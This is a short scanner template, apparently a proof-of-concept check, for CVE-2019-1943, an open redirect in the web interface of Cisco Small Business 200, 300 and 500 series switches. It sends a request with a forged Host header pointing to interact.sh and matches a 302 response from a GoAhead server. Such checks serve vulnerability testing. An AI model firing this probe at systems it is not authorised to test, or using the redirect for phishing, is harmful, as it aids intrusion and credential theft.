[info]
author = "ave"
description = "Cisco Small Business 200、300和500系列交换机Web界面存在开放重定向漏洞。攻击者可拦截并篡改用户的HTTP请求，诱导Web界面将用户重定向至恶意URL，进而发起钓鱼攻击或窃取用户凭据。"
id = "POC-AVE-2019-0145"
name = "CVE-2019-1943 PoC"
severity = "medium"
tags = ["ave-2019-0145"]
vuln_id = [
    "CVE-2019-1943",
    "AVE-2019-0145",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.headers]
Host = "interact.sh"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["GoAhead-Webs"]

[[poc.requests.matchers]]
expect = true
status = [302]
type = "status"
